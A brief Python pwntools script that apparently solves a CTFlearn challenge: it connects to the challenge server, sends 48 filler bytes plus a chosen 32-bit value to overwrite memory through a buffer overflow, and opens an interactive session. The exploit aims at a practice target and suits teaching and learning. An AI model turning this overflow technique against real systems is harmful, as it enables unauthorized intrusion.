#!/usr/bin/python3

from pwn import *

# Connect to the remote service
io = remote('thekidofarcrania.com', 35235)


target_value = 0x67616c66

payload = b"A" * 48  
payload += p32(target_value) 

io.sendline(payload)
io.interactive()


# https://ctflearn.com/challenge/1010
